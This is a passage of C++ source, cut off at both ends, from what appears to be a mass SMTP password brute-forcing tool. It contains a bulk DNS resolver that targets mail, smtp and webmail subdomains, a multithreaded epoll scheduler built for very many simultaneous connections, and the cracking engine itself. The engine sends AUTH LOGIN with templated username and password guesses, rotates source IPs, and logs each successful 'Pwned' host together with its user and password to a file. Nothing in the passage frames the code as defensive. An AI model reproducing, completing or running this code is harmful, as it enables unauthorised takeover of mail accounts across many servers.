			info.l_value >= sizeof(uint32_t) &&
			info.l_domain <= DNS_EXTRACTOR_DOMAIN_LEN_MAX - 10
			) {

			if (!strstr((const char*)info.p_domain, domain)) {
				//std::cout << "p_domain " << (char*)info.p_domain << std::endl;
				//std::cout << "domain " << domain << std::endl;
				//exit(0);
				return 0;
			}

			uint32_t address = *(uint32_t*)&info.p_value[0];

			info.p_domain[info.l_domain] = 0;

			//std::cout << "extract_ipaddr p_domain:" << (char*)info.p_domain << std::endl;

			char str[0xff] = { 0 };
			inet_ntop(AF_INET, &address, str, INET_ADDRSTRLEN);

			//std::cout << "extract_ipaddr " << str << std::endl;

			return address;
		}

		return 0;
	}

	/*
	 * This will convert www.google.com to 3www6google3com
	 * got it :)
	 * */
	void ChangetoDnsNameFormat(unsigned char* dns, unsigned char* host)
	{
		int lock = 0, i;
		strcat((char*)host, ".");

		for (i = 0; i < strlen((char*)host); i++)
		{
			if (host[i] == '.')
			{
				*dns++ = i - lock;
				for (; lock < i; lock++)
				{
					*dns++ = host[lock];
				}
				lock++; //or lock=i+1;
			}
		}
		*dns++ = '\0';
	}

}


#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <math.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/epoll.h>
#include <sys/sysinfo.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>

#include <iostream>
#include <fstream>
#include <map>
#include <vector>
#include <set>
#include <typeinfo>
#include <functional>
#include <memory>
#include <algorithm>
#include <atomic>
#include <unordered_map>

#include <cstring>

namespace domains_cache {
	struct cache_entry_t {
		char* fulldomain;
		uint32_t address;
	};

	std::unordered_map<std::string, cache_entry_t> _hosts_cache;
	pthread_mutex_t _write_mutex;
	FILE* _fd_hosts = 0;

	inline void load_cache_entry(char* p_text) {
		// "|mainpart.com|127.0.0.1" 
		// "mail.|mainpart.com|127.0.0.2"

		char* p_mainpart = strchr(p_text, '|');
		if (!p_mainpart) return;
		*p_mainpart = 0;
		p_mainpart++;

		char* p_ipaddr = strchr(p_mainpart, '|');
		if (!p_ipaddr) return;
		*p_ipaddr = 0;
		p_ipaddr++;

		char* p_fulldomain = p_text + 1;

		if (p_text[0]) {
			memmove(p_fulldomain, p_text, strlen(p_text));
		}

		uint32_t sin_addr = 0;

		if (p_ipaddr[0] != '-') {
			inet_pton(AF_INET, p_ipaddr, &sin_addr);
		}

		/*std::cout << "Loaded cache entry:" << std::endl;
		std::cout << "Key: " << p_mainpart << std::endl;
		std::cout << "Domain: " << p_fulldomain << std::endl;
		std::cout << "IP: " << p_ipaddr << " " << sin_addr << std::endl;
*/

		_hosts_cache.insert(std::make_pair(p_mainpart, cache_entry_t{ p_fulldomain, sin_addr }));
	}

	void init() {
		if (_hosts_cache.size())
			return;

		pthread_mutex_init(&_write_mutex, 0);
		_fd_hosts = fopen(globs.hosts_cache_filename, "a");

		//std::cout << "Loading DNS cache..." << std::endl;

		std::vector<char*> entries;

		if (!read_words(globs.hosts_cache_filename, entries))
			return;

		for (char* item : entries) {

			load_cache_entry(item);

		}

		std::cout << "Done: " << _hosts_cache.size() << std::endl;
	}

	bool resolve(std::vector<char*>& hosts, std::vector<sockaddr_in>& hosts_addr) {

		if (_hosts_cache.empty())
			return false;

		int success = 0;

		//std::cout << "Resolving from cache...   " << hosts.size() << std::endl;

		for (int i = 0; i < hosts.size(); i++) {

			if (hosts_addr[i].sin_addr.s_addr != 1)
				continue;

			auto it = _hosts_cache.find(hosts[i]);

			if (it != _hosts_cache.end()) {
				success++;
				hosts_addr[i].sin_addr.s_addr = it->second.address;
				hosts[i] = it->second.fulldomain;

				if (it->second.address)
					globs.good_domains_counter++;
			}

		}

		//std::cout << "Domains resolved from cache: " << success << std::endl;

		globs.domains_from_cache_counter += success;

		return success == hosts.size();
	}

	void add(int subdomain, const char* hostname, uint32_t addr) {

		char str_addr[0xff] = "-";

		if (addr) {
			inet_ntop(AF_INET, &addr, str_addr, INET_ADDRSTRLEN);
		}

		pthread_mutex_lock(&_write_mutex);

		fprintf(_fd_hosts, "%s|%s|%s\n", globs.subdomains[subdomain], hostname, str_addr);

		pthread_mutex_unlock(&_write_mutex);
	}

	void flash() {
		pthread_mutex_lock(&_write_mutex);

		fflush(_fd_hosts);

		pthread_mutex_unlock(&_write_mutex);
	}
}



class dns_super_resolver : public task_manager {
	std::vector<char*>& _hosts;
	std::vector<sockaddr_in>& _hosts_addr;

	std::atomic_int _next_index;
	std::atomic_int _pending_tasks_count;

	inline bool pop_unprocessed_task_safety(int& index) {

		while (_pending_tasks_count > 0)
		{
			index = _next_index++;

			if (index >= _hosts.size())
				return false;

			_pending_tasks_count--;

			if (_hosts_addr[index].sin_addr.s_addr == 1)
				return true;
		};

		return false;
	}

	virtual int64_t pending_tasks_count() override {
		return _pending_tasks_count;
	}

	virtual scheduler_task* get_next_task() override {
		int index = 0;

		if (!pop_unprocessed_task_safety(index))
			return nullptr;

		globs.running_dns_counter++;

		return new dns_task(0, _hosts[index], index);
	}

	inline void update_domain_if_needed(dns_task* task) {
		if (task->hostaddress()) {
			if (strcmp(_hosts[task->hostindex()], task->domain())) {

				char* tmp = new char[strlen(task->domain()) + 1];
				strcpy(tmp, task->domain());
				_hosts[task->hostindex()] = tmp;

			}
		}
	}

	virtual void on_task_completed_callback(scheduler_task* stask, bool timeout) override {

		globs.running_dns_counter--;

		auto task = static_cast<dns_task*>(stask);
		uint32_t ihost = task->hostindex();

		//std::cout << "_success_counter: " << globs.good_domains_counter.load() << " / " << _hosts_addr.size() << std::endl;
		//std::cout << "on_task_completed_callback hostindex: " << task->hostindex() << std::endl;
		//std::cout << "host address : " << task->hostaddress() << std::endl;

		if (!timeout) {
			domains_cache::add(task->subdomain(), _hosts[task->hostindex()], task->hostaddress());
		}

		update_domain_if_needed(task);

		_hosts_addr[ihost].sin_addr.s_addr = task->hostaddress();

		if (task->hostaddress())
			globs.good_domains_counter++;

		globs.checked_domains_counter++;

		if (timeout)
			globs.dns_timeout_error_counter++;

		delete task;
	}

public:

	dns_super_resolver(std::vector<char*>& hosts, std::vector<sockaddr_in>& hosts_addr) :
		_hosts(hosts), _hosts_addr(hosts_addr)
	{
		_next_index = 0;
		_pending_tasks_count = _hosts.size();
	}

	void execute() {

		scheduler_params params;
		params.max_running_tasks = 100000;
		params.task_timeout_in_seconds = 7;

		params.startup_portion_size = 700;
		params.seconds_before_next_portion = 1;

		scheduler_execute_tasks_async(*this, 8, params);

		domains_cache::flash();
	}
};

void load_nameservers() {

	if (!read_words("nameservers.txt", globs.nameservers)) {
		std::cerr << "nameservers.txt is empty" << std::endl;
		exit(0);
	}

	globs.nameservers.clear();

	// Add load on the most powerful servers
	for (int i = 0; i < 800; i++) {
		globs.nameservers.push_back((char*)"208.67.222.222");
		globs.nameservers.push_back((char*)"208.67.220.220");
	}

	for (int i = 0; i < 300; i++) {
		globs.nameservers.push_back((char*)"8.8.8.8");
		globs.nameservers.push_back((char*)"8.8.4.4");
	}

}

void load_subdomains() {

	globs.subdomains.clear();

	globs.subdomains.push_back("mail.");
	globs.subdomains.push_back("smtp.");
	globs.subdomains.push_back("webmail.");
	globs.subdomains.push_back("");

}

void resolver_init() {

	static bool done = false;
	if (done) return;
	done = true;

	load_nameservers();

	load_subdomains();

	domains_cache::init();
}

bool resolve_domains(std::vector<char*>& hosts, std::vector<sockaddr_in>& hosts_addr) {

	resolver_init();

	if (domains_cache::resolve(hosts, hosts_addr))
		return true;

	dns_super_resolver resolver(hosts, hosts_addr);

	resolver.execute();

}

#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <math.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/epoll.h>
#include <sys/sysinfo.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>

#include <iostream>
#include <fstream>
#include <map>
#include <vector>
#include <set>
#include <typeinfo>
#include <functional>
#include <memory>
#include <algorithm>
#include <atomic>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <cstring>

struct worker_item_t {
	time_t time_of_last_activity;
	scheduler_task* worker;
	int index;
};

struct worker_container_events {
	virtual bool on_task_added(worker_item_t*) = 0;
};

class workers_container {

	std::vector<worker_item_t> _buffer;

	int _number_of_items = 0;
	int _offset = 0;

	task_manager& _manager;

	worker_container_events* _events;

private:

	void delete_task(int index) {
		worker_item_t* item = &_buffer[index];
		if (!item->worker)
			return;

		memset(item, 0, sizeof(worker_item_t));
		_number_of_items--;
	}

	bool add_task_at(int index, scheduler_task* task) {
		if (!task) {
			return false;
		}

		worker_item_t* data = &_buffer[index];
		data->index = index;
		data->worker = task;

		_number_of_items++;

		_events->on_task_added(data);
		return true;
	}


public:

	workers_container(task_manager& m, int capacity, worker_container_events* e) :
		_manager(m), _events(e) {

		_buffer.resize(capacity);
		_number_of_items = 0;
	}

	inline bool is_full() {
		return  _offset >= _buffer.size();
	}

	bool add_tasks_up_to_max(int max_count) {

		int added = 0;

		for (; _offset < _buffer.size() && added < max_count; _offset++, added++) {
			if (!add_task_at((int)_offset, _manager.get_next_task()))
				break;
		}

		//std::cout << "Tasks added: " << i << " / " << _buffer.size() << std::endl;

		return added > 0;
	}

	void delete_task_and_add_next(int index, scheduler_task* task = nullptr) {

		delete_task(index);

		add_task_at(index, task ? task : _manager.get_next_task());

	}

	inline void for_each(std::function<void(worker_item_t*)> func) {

		for (worker_item_t& item : _buffer) {
			if (item.worker) {
				func(&item);
			}
		}

	}

	inline int count() {
		return _number_of_items;
	}
};

class async_worker_thread : public worker_container_events {
	task_manager& _manager;
	const scheduler_params _params;
	workers_container _current_tasks;

	int _epoll_fd;

	pthread_t _thread;

	const int _epoll_queue_size = 300;

	time_t _time_of_last_idle_check = 0;

	inline time_t get_current_time() {
		struct timespec ts;
		clock_gettime(CLOCK_MONOTONIC, &ts);
		return ts.tv_sec;
	}

	void set_nonblock_for_socket(int fd) {
		int flags = fcntl(fd, F_GETFL, 0);
		if (flags == -1)
			flags = 0;

		fcntl(fd, F_SETFL, flags | O_NONBLOCK);
	}

	virtual bool on_task_added(worker_item_t* item) override {

		int sock = item->worker->get_socket();

		// Add socket watching
		struct epoll_event ev;
		ev.events = EPOLLIN | EPOLLOUT | EPOLLRDHUP | EPOLLET; // Edge triggered.
		ev.data.ptr = reinterpret_cast<void *>(item);

		set_nonblock_for_socket(sock);

		if (epoll_ctl(_epoll_fd, EPOLL_CTL_ADD, sock, &ev) == -1) {
			std::cerr << "epoll_ctl add: " << sock << " " << strerror(errno) << '\n';
			exit(1);
		}

		item->time_of_last_activity = get_current_time();

		item->worker->try_to_connect();

		return true;
	}


	void delete_task_and_run_next(worker_item_t* item, bool timeout) {
		if (!item->worker)
			return;

		// task_item_t will be cleaned
		scheduler_task* completed_task = item->worker;
		int sock = item->worker->get_socket();

		// Delete socket watching
		if (sock && epoll_ctl(_epoll_fd, EPOLL_CTL_DEL, sock, nullptr) == -1) {
			std::cerr << "epoll_ctl del: " << sock << " " << strerror(errno) << '\n';
			// exit(1); this error can occers. is it not fatal?
		}

		// If completed task has the primary task then do it and don't need to notify manager yet
		scheduler_task* primary_task = completed_task->get_primary_task();

		if (primary_task) {
			_current_tasks.delete_task_and_add_next(item->index, primary_task);
			// The task will be cleaned in right way because it have virtual destructor
			delete completed_task;
		}
		else {
			_current_tasks.delete_task_and_add_next(item->index);
			// Task completed now: notify manager and remove it
			_manager.on_task_completed_callback(completed_task, timeout);
		}
	}

	void terminate_idle_tasks() {
		time_t current_time = get_current_time();

		if (current_time - _time_of_last_idle_check < 7)
			return;

		_time_of_last_idle_check = current_time;

		_current_tasks.for_each([&](worker_item_t* item) {
			if ((current_time - item->time_of_last_activity) > _params.task_timeout_in_seconds) {

				// Ask task, can we finish it or not
				if (item->worker->try_to_complete_by_timeout()) {
					delete_task_and_run_next(item, true);
				}
				else {
					item->time_of_last_activity = current_time;
				}

			}
			});
	}

	void* worker_thread_proc()
	{
		time_t time_of_last_startup_add = get_current_time();

		std::cout << "Worker thread started." << std::endl;

		if (!_current_tasks.add_tasks_up_to_max(_params.startup_portion_size)) {
			std::cout << "There are no tasks to execute!" << std::endl;
			return nullptr;
		}

		std::vector<struct epoll_event> events(_epoll_queue_size);

		while (_current_tasks.count() || _manager.pending_tasks_count())
		{
			int event_count = epoll_wait(_epoll_fd, &events[0], _epoll_queue_size, 1000);

			if (event_count == -1) {
				std::cerr << "epoll_wait error. " << std::endl;
				exit(1);
			}

			time_t current_time = get_current_time();

			for (int i = 0; i < event_count; i++)
			{
				epoll_event epollitem = events[i];
				worker_item_t* taskitem = static_cast<worker_item_t*>(epollitem.data.ptr);
				if (!taskitem)
					continue;

				if (epollitem.events&EPOLLIN) {
					// Update activity timestamp when have input data
					taskitem->time_of_last_activity = current_time;
				}

				if (taskitem->worker->try_to_complete()) {

					delete_task_and_run_next(taskitem, false);

				}
			}

			terminate_idle_tasks();

			if (!_current_tasks.is_full() &&
				current_time - time_of_last_startup_add > _params.seconds_before_next_portion) {

				time_of_last_startup_add = get_current_time();
				_current_tasks.add_tasks_up_to_max(_params.startup_portion_size);

			}
		}


		std::cout << "Worker thread finished." << std::endl;
		return nullptr;
	}

public:

	async_worker_thread(task_manager& m, const scheduler_params params) :
		_manager(m),
		_params(params),
		_current_tasks(m, params.max_running_tasks, this)
	{
		_thread = 0;

		_epoll_fd = epoll_create1(0);
		if (_epoll_fd == -1) {
			std::cerr << "Error creating epoll fd\n";
			exit(1);
		}
	}

	~async_worker_thread() {
		close(_epoll_fd);
	}


	bool run() {

		if (0 == pthread_create(
			&_thread,
			0,
			(void * (*)(void *))&async_worker_thread::worker_thread_proc,
			this))
		{
			return true;
		}
		else
		{
			_thread = 0;
			std::cerr << "pthread_create fail." << std::endl;
			return false;
		}

	}

	void wait() {
		if (_thread)
			pthread_join(_thread, nullptr);
	}
};

bool off_SIGPIPE() {
	struct sigaction sa;
	sigset_t newset;
	sigemptyset(&newset);
	sigaddset(&newset, SIGPIPE);
	return 0 == sigprocmask(SIG_BLOCK, &newset, 0);
}

void scheduler_execute_tasks_async(task_manager& source, int number_of_threads, const scheduler_params params) {

	int max_tasks_per_thread = params.max_running_tasks / number_of_threads;
	if (!max_tasks_per_thread)
		max_tasks_per_thread = 1;

	std::cout << "Max connections: " << params.max_running_tasks << std::endl;
	std::cout << "Max connections per thread: " << max_tasks_per_thread << std::endl;

	std::vector<std::shared_ptr<async_worker_thread>> workers;

	bool offsp = off_SIGPIPE();

	std::cout << "Ignoring SIGPIPE: " << offsp << std::endl;

	// Run worker threads.
	for (int i = 0; i < number_of_threads; i++) {
		scheduler_params thparams = params;
		thparams.max_running_tasks = max_tasks_per_thread;
		auto worker = std::make_shared<async_worker_thread>(source, thparams);

		if (!worker->run()) {
			std::cerr << "Created ONLY " << i << " threads / " << number_of_threads << std::endl;
			break;
		}

		workers.push_back(worker);
	}

	std::cout << "Created " << workers.size() << " threads." << std::endl;

	// Wait for completion of all threads.
	for (auto& worker : workers) {
		worker->wait();
	}

	std::cout << "All threads are complete." << std::endl;
}

#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <math.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/epoll.h>
#include <sys/sysinfo.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>

#include <iostream>
#include <fstream>
#include <map>
#include <vector>
#include <set>
#include <typeinfo>
#include <functional>
#include <memory>
#include <algorithm>
#include <atomic>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <cstring>

std::vector<char*> __subs;
std::vector<int>   __subs_len;

std::vector<char*> __local_ips;
std::vector<sockaddr_in> __local_addr;

std::map<uint32_t, int> __cracked_map; //A map of cracked host addresses.

const sockaddr_in* get_rundom_localaddr() {

	if (__local_addr.size()) {
		return &__local_addr[rand() % __local_addr.size()];
	}

	return nullptr;
}

inline bool is_host_cracked(uint32_t address) {
	if (__cracked_map.size())
		return false;

	return __cracked_map.count(address) > 0;
}


#ifdef _D_SMTP_OVER_SSL
typedef  ssl_socket_task socket_task_t;
#else
typedef  socket_task socket_task_t;
#endif

class smtp_brute_task : public socket_task_t {
public:
	enum status_t
	{
		auth_noconnection,
		auth_connected,
		auth_success, // Log success, disconnect from server, don't connect again.
		auth_fail, // Try a different password.
		auth_error // Disconnect.
	};

	struct params_t {
		int hostindex;
		char* host;
		const char* username;
		const char* passchain;
		const sockaddr_in* hostaddr;
		const sockaddr_in* localaddr;
	};

private:

	status_t _auth_status = status_t::auth_noconnection;

	params_t _params;

	char banner[1024];
	char response[2048];
	char* _domain;

	char USER[128];
	char User[128];
	char no_tld[128];
	char no_tld_up[128];

	std::string _password;
	std::string usr_at_dom;
	const char* _server = "-";

	int _start_pos = 0;
	int _end_pos = 0;

	virtual void on_connected_callback() override {

		//	if (check_date())
		//		return;

		globs.established_connections_counter++;
		globs.running_connections_counter++;

		_auth_status = auth_connected;

		brute_smtp_now();
	}

	bool starts_with(char *str, char *sub)
	{
		while (*str == *sub)
		{
			str++; sub++;
		}
		return *sub == 0;
	}

	char* get_main_domain() {

		for (int i = 0; i < globs.subdomains.size() - 1; i++) {
			if (starts_with(_params.host, globs.subdomains[i]))
				return strchr(_params.host, '.') + 1;
		}

		return _params.host;
	}

	void brute_smtp_now()
	{
		// Receive banner
		recv_async(banner, sizeof(banner), [this](int) {
			// Count the number of connection attempts.

			// printf("Banner: %s\n", banner);
			const char ehlo[] = "EHLO User\r\n";

			// Receive ehlo response
			send_recv_async(ehlo, (int)strlen(ehlo), response, sizeof(response), [this](int) {
				// const char ehlo[] = "HELO User\r\n";
				// printf("ehlo response: %s\n", response);

				if (0 != strncmp(response, "250", 3)) {
					process_auth_status(status_t::auth_error);
					// smtp_soft_quit();
					return;
				}

#ifdef _D_DOMAIN_FROM_BANNER

				//The host name occurs twice: first in banner, then in the EHLO response.
				//The banner sometimes contains garbage.
				//Very rarely, EHLO response doesn't contain the domain name as well.
				//Try the banner first.
				_domain = extract_domain(banner, __subs, __subs_len);
				if (!_domain || !maybe_valid_domain(_domain)) {
					//Otherwise, try the EHLO response.
					_domain = extract_domain(response, __subs, __subs_len);
					if (!_domain || !maybe_valid_domain(_domain)) {
						process_auth_status(status_t::auth_error);
						// smtp_soft_quit();
						return;
					}
				}
				_server = _params.host;
#else
				_domain = get_main_domain();
				_server = _domain;
#endif

				uppercase(_params.username, USER);

				capitalize(_params.username, User);

				get_first_part(_domain, no_tld, 128);

				capitalize(no_tld, no_tld_up);

				char user_at_dom[1024] = "\0";
				int n = snprintf(user_at_dom, sizeof(user_at_dom), "%s@%s", _params.username, _domain);

				usr_at_dom = globs.cfg.use_simple_username ? std::string(_params.username) : std::string(user_at_dom);

				replace(usr_at_dom, "%domain%", no_tld);
				replace(usr_at_dom, "%Domain%", no_tld_up);

				if (n <= 0 || n >= (int)sizeof(user_at_dom)) {
					//Buffer too small or other snprintf error.
					process_auth_status(status_t::auth_error);
					// smtp_soft_quit();
					return;
				}
				//std::cout << "userd:" << user_at_dom << std::endl;

				try_next_password(/*no_tld_up, no_tld, user, User, USER, domain*/);

				}); // receive ehlo response

			}); // Receive banner;
	}

	void try_next_password(/*std::string no_tld_up, std::string no_tld, std::string user, std::string User, std::string USER, std::string domain*/)
	{
		while (_params.passchain[_end_pos] && _params.passchain[_end_pos] != '|') {
			++_end_pos;
		}

		if (_end_pos <= _start_pos) {
			smtp_soft_quit();
			return;
		}

		_password = std::string(_params.passchain + _start_pos, _end_pos - _start_pos);
		replace(_password, "%Domain%", no_tld_up);
		replace(_password, "%domain%", no_tld);
		replace(_password, "%user%", _params.username);
		replace(_password, "%User%", User);
		replace(_password, "%USER%", USER);
		replace(_password, "%domaintld%", _domain);

		//std::cout << "Pwd:" << pwd.c_str() << "~" << std::endl;

		try_auth();
	}

	void process_auth_status(status_t status) {

		_auth_status = status;

		if (status == status_t::auth_fail) {
			//Try a different password.
			globs.login_attempts_counter++;

		}
		else if (status == status_t::auth_success) {

			globs.login_attempts_counter++;

			//Log the cracked host.

		}
		else if (status == status_t::auth_error) {
			// Some error in communication, no reason to continue.
			// smtp_soft_quit(); - no reason to do soft quit 
		}
	}

	void try_auth()
	{
		//static char response[256];
		static const char rset[] = "RSET\r\n";
		static const char auth[] = "AUTH LOGIN\r\n";

		send_recv_async(rset, strlen(rset), response, sizeof(response), [this](int) {

			send_recv_async(auth, strlen(auth), response, sizeof(response), [this](int) {

				if (0 != strncmp(response, "334", 3)) {
					process_auth_status(status_t::auth_error);
					return;
				}

				if (globs.cfg.debug == 1 || globs.cfg.debug == 3) {
					//	std::cout << "[+]Trying " << _hosts[host_i] << " " << usr_at_dom << " " << _password << std::endl;
				}

				char code[512];
				//Send user_at_dom encoded as base64
				int code_size = base64_encode(usr_at_dom.c_str(), (int)usr_at_dom.length(), code, sizeof(code));
				if (code_size <= 0) {
					process_auth_status(status_t::auth_error);//Encoding error.
					return;
				}

				//std::cout << "enc size:" << enc_size << std::endl;
				code[code_size++] = '\r';
				code[code_size++] = '\n';

				send_recv_async(code, code_size, response, sizeof(response), [this](int) {

					char code[512];
					//Send pwd encoded as base64
					int code_size = base64_encode(_password.c_str(), (int)_password.length(), code, sizeof(code));
					if (code_size <= 0) {
						process_auth_status(status_t::auth_error);
						return;//Encoding error.
					}

					//std::cout << "enc size:" << enc_size << std::endl;
					code[code_size++] = '\r';
					code[code_size++] = '\n';

					send_recv_async(code, code_size, response, 256, [this](int) {

						if (strncmp(response, "235", 3)) {
							process_auth_status(status_t::auth_fail);
							smtp_soft_quit();
						}
						else {
							process_auth_status(status_t::auth_success);
							smtp_soft_quit();
						}

						});

					});

				}); // send_recv auth

			}); // send_recv rset
	}

	void smtp_soft_quit()
	{
		static char buf[512];
		static const char quit[] = "QUIT\r\n";

		send_recv_async(quit, strlen(quit), buf, sizeof(buf), [](int) {

			});

		// In fact we have no reason to exit with this command...
		// After fail login attempt many smtp server will close
		// connection and we will catch TCP error when will wait for resonse.
	}

	//Shorten a domain name leaving only N upper domains.
	char* clip_domain_name(char* str, int str_len, int n_levels)
	{
		for (int i = str_len - 1; i >= 0; --i) {
			if (str[i] == '.') {
				if (--n_levels <= 0) {
					return str + i + 1;
				}
			}
		}
		return str;
	}

	//Destroys the banner string.
	char* extract_domain(char* banner, const std::vector<char*>& subs, const std::vector<int>& subs_len)
	{
		if (strlen(banner) < 4) {
			return 0;
		}
		int start = 4;//Skip the "220 " or "220-" or "250-"
		int end = start;
		while (banner[end] && banner[end] != ' ' && banner[end] != '\n' && banner[end] != '\r') {
			++end;
		}
		if (end <= start) {
			return 0;
		}
		banner[end] = 0;
		//The substring banner[start..end] now has the full domain name.
		for (unsigned i = 0; i < subs.size(); i++) {
			if (ends_with(&banner[start], end - start, subs[i], subs_len[i])) {
				//std::cout << banner << "~ ends with ~" << subs[i] << std::endl;
				return clip_domain_name(banner + start, end - start, 3);
			}
		}
		return clip_domain_name(banner + start, end - start, 2);
	}

	// Cull *some* (not all) invalid domain names.
	bool maybe_valid_domain(const char* str)
	{
		bool has_alpha = false;
		bool has_dot = false;
		if (!str[0]) {
			return false;
		}
		if (!isalnum(str[0])) {
			return false;
		}
		char c;
		for (const char* s = str; *s; ++s) {
			c = *s;
			if (isalpha(c)) {
				has_alpha = true;
				continue;
			}
			if (isdigit(c) || c == '-') {
				continue;
			}
			if (c == '.') {
				has_dot = true;
				continue;
			}
			//Invalid character.
			return false;
		}
		//The last character must be alphanumeric.
		if (!isalnum(c)) {
			return false;
		}
		if (has_alpha && has_dot) {
			return true;
		}
		return false;
	}

	void get_first_part(const char* src, char* dst, int dst_size)
	{
		int i = 0;
		while (i < dst_size - 1) {
			if (!src[i] || src[i] == '.') {
				break;
			}
			dst[i] = src[i];
			++i;
		}
		dst[i] = 0;
	}



public:

	smtp_brute_task(params_t params)
		:socket_task_t(params.hostaddr, params.localaddr), _params(params) {

	}

	~smtp_brute_task() {
		if (!is_noconnection()) {
			globs.running_connections_counter--;
		}
	}

	inline 	bool is_success() {
		return auth_success == _auth_status;
	}

	inline 	bool is_fail() {
		return auth_fail == _auth_status;
	}

	inline 	bool is_error() {
		return auth_error == _auth_status;
	}

	inline 	bool is_noconnection() {
		return auth_noconnection == _auth_status;
	}

	inline std::string password() {
		return _password;
	}

	inline std::string user() {
		return usr_at_dom;
	}

	inline const char* server() {
		return _server;
	}

	inline const params_t* params() {
		return &_params;
	}
};

class smtp_bruteforcer : public task_manager {
	brute_inputs& _info;

	int64_t _total_tasks_count = 0;
	std::atomic<int64_t> _pending_tasks_count;
	std::atomic<int64_t> _next_task_index;
	std::atomic<int> _running_tasks_count;

	// Only for statistical goals

	std::vector<bool> _is_bad_host_saved;

	FILE* _fd_cracked_hosts = 0;
	FILE* _fd_fail_hosts = 0;
	pthread_mutex_t _mutex_writefail;
	pthread_mutex_t _mutex_writecracked;

	inline bool is_task_valid(int64_t itask) {
		int ihost = itask % _info.hosts.size();
		uint32_t address = _info.hosts_addr[ihost].sin_addr.s_addr;

		if (!address || 1 == address)
			return false;

		return is_host_cracked(address) == false;
	}

	inline bool pop_unprocessed_task_safety(int64_t& task_index) {

		while (_pending_tasks_count.load() > 0)
		{
			// task_index now contains unprocessed task index
			task_index = _next_task_index++;

			if (task_index >= _total_tasks_count) {
				// All tasks are in processing already
				return false;
			}

			_pending_tasks_count--;
			globs.processed_tasks_counter++;

			if (is_task_valid(task_index))
				return true;

		};

		return false;
	}

	// task_manager interface methods implementation:

	virtual int64_t pending_tasks_count() override {

		return _pending_tasks_count;
	}

	virtual scheduler_task* get_next_task() override {
		int64_t task_index;

		if (!pop_unprocessed_task_safety(task_index))
			return nullptr;

		globs.running_tasks_counter++;

		size_t ihost = task_index % _info.hosts.size();
		size_t iusername = (task_index / _info.hosts.size()) % _info.users.size();
		size_t ipasschain = (task_index / _info.hosts.size() / _info.users.size()) % _info.passchains.size();

		smtp_brute_task::params_t params;

		params.hostindex = ihost;
		params.host = _info.hosts[ihost];
		params.username = _info.users[iusername];
		params.passchain = _info.passchains[ipasschain];
		params.hostaddr = &_info.hosts_addr[ihost];
		params.localaddr = get_rundom_localaddr();

		return new smtp_brute_task(params);
	}

	virtual void on_task_completed_callback(scheduler_task* stask, bool timeout) override {

		if (timeout)
			globs.timeout_counter++;

		auto* task = static_cast<smtp_brute_task*>(stask);

		if (task->is_success()) {

			if (globs.cfg.debug == 4 || globs.cfg.debug == 5) {
				std::cout << "[+]Pwned => " << task->params()->host << " " << task->user() << " " << task->password() << std::endl;
			}

			__cracked_map[task->params()->hostaddr->sin_addr.s_addr] = 1;
			// ? task->params()->hostaddr->sin_addr.s_addr = 0; // hostadr points to _hosts_addr


			if (_fd_cracked_hosts) {
				pthread_mutex_lock(&_mutex_writecracked);
				fprintf(_fd_cracked_hosts, "%s %s %s\n", task->params()->host, task->user().c_str(), task->password().c_str());
				fflush(_fd_cracked_hosts);
				pthread_mutex_unlock(&_mutex_writecracked);
			}

			globs.cracked_hosts_counter++;

		}
		else {

			if (task->is_fail()) {

				if (globs.cfg.log_bad && _fd_fail_hosts && !_is_bad_host_saved[task->params()->hostindex]) {
					pthread_mutex_lock(&_mutex_writefail);
					fprintf(_fd_fail_hosts, "%s\n", task->server());
					fflush(_fd_fail_hosts);
					_is_bad_host_saved[task->params()->hostindex] = true;
					pthread_mutex_unlock(&_mutex_writefail);
				}

			}
			else if (task->is_error()) {

				globs.smtp_error_counter++;

			}
			else if (task->is_noconnection()) {

			}

		}

		globs.running_tasks_counter--;

		// Work is done, free the task
		delete task;
	}

public:

	smtp_bruteforcer(brute_inputs& db) :_info(db) {

		_total_tasks_count = _info.users.size() * _info.passchains.size() * _info.hosts.size();
		_pending_tasks_count = _total_tasks_count;

		_next_task_index = 0;

		std::cout << "N total tasks: " << _total_tasks_count << std::endl;

		pthread_mutex_init(&_mutex_writefail, 0);
		pthread_mutex_init(&_mutex_writecracked, 0);

		if (globs.cfg.log_bad) {
			_fd_fail_hosts = fopen(globs.bad_filename, "a");

			_is_bad_host_saved.resize(_info.hosts.size());
		}

		_fd_cracked_hosts = fopen(globs.valid_filename, "a");

		if (!_fd_cracked_hosts) {
			std::cerr << "Can't create output file." << std::endl;
			exit(0);
		}

		std::cout << "Logging cracked hosts to '" << globs.valid_filename << "'" << std::endl;
	}

	~smtp_bruteforcer()
	{
		if (_fd_fail_hosts)
			fclose(_fd_fail_hosts);

		fclose(_fd_cracked_hosts);
	}

	void execute() {
		if (_total_tasks_count <= 0)
			return;

		scheduler_params params;
		params.max_running_tasks = globs.cfg.max_concurrent_connections;
		params.task_timeout_in_seconds = globs.cfg.connection_timeout_sec;

#ifdef _D_SMTP_OVER_SSL
		params.startup_portion_size = 700;
		params.seconds_before_next_portion = 1;
#else
		params.startup_portion_size = 4000;
		params.seconds_before_next_portion = 1;
#endif

		scheduler_execute_tasks_async(*this, globs.cfg.number_of_threads, params);
	}

};


void bruteforce_smtp(brute_inputs& data) {
	smtp_bruteforcer brut(data);

	brut.execute();
}

void load_localips() {
	read_words(globs.local_ips_filename, __local_ips);

	for (int i = 0, j = 0; i < (int)__local_ips.size(); i++, j++) {
		sockaddr_in addr = { 0 };
		addr.sin_family = AF_INET;
		addr.sin_port = htons(0);
		if (1 != inet_pton(AF_INET, __local_ips[i], &addr.sin_addr)) {
			std::cerr << "Invalid local host address: " << __local_ips[i] << std::endl;
			j--;
		}
		else {
